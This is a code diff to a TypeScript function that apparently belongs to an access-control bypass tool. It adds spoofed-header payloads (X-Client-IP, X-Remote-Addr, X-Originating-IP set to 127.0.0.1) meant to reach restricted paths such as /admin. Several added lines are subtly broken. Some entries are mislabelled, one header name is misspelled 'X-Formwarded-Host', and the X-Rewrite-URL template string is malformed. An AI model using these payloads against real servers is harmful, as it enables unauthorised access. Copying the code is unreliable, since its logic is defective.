@@ -205,6 +205,13 @@ async function performBypassAttempt(url: string): Promise<BypassAttempt[]> {
     { name: "Base", header: null },
     { name: "X-Forwarded-For", header: "X-Forwarded-For: 127.0.0.1" },
     { name: "X-Original-URL", header: "X-Original-URL: /admin" },
+    {name:"X-Forwarded-For-127",header:"X-Originating-IP:  127.0.0.1"},
+    {name:"X-Remote-Ip",header:"X-Remote-IP: 127.0.0.1"},
+    {name:"X-Remote-Addr",header: "X-Remote-Addr: 127.0.0.1"},
+    {name:"X-Client-IP",header:"X-Client-IP: 127.0.0.1"},
+    {name:"X-Host",header:"X-Client-IP: 127.0.0.1"},
+    {name:"X-Forwarded-Host",header : "X-Formwarded-Host: localhost"},
+    {name:"X-Rewrite-URL", header:`X-Rewrite-URL:${url.endsWith("/")}?${url}:${url}+"/"}`}
   ];
 
   for (const payload of bypassPayloads) {
